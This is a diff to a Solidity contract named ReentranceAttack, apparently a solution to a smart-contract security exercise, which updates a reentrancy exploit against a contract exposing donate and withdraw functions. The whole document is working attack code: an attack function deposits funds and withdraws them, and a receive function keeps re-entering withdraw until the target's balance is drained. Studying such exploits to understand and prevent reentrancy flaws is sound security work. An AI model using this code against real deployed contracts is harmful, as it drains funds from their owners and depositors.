@@ -1,3 +1,8 @@
+// SPDX-License-Identifier: MIT
+pragma solidity ^0.6.12;
+
+import "hardhat/console.sol";
+
 interface Reentrance {
   function donate(address _to) external payable;
   function withdraw(uint _amount) external;
@@ -8,20 +13,19 @@ contract ReentranceAttack {
   
   Reentrance reentranceContract;
 
-  constructor (address _reentrance) {
+  constructor (address _reentrance) public {
     reentranceContract = Reentrance(_reentrance);
   }
-
-  function attack(uint _amount) public {
-    reentranceContract.donate(address(this));
-    reentranceContract.withdraw(_amount);
+  function attack() external payable {
+    reentranceContract.donate{value: msg.value}(address(this));
+    reentranceContract.withdraw(msg.value);
   }
 
-  fallback() external payable{
-    uint balance = reentranceContract.balanceOf(address(this));
-    if (balance >= 0) {
-        reentranceContract.withdraw(msg.value);
+  receive() external payable{
+    uint targetBalance = address(reentranceContract).balance;
+    if (targetBalance >= 0) {
+        uint amountToWithdraw = targetBalance >= msg.value ? msg.value : targetBalance;
+        reentranceContract.withdraw(amountToWithdraw);
     }
   }
-  receive() external payable{}
 }
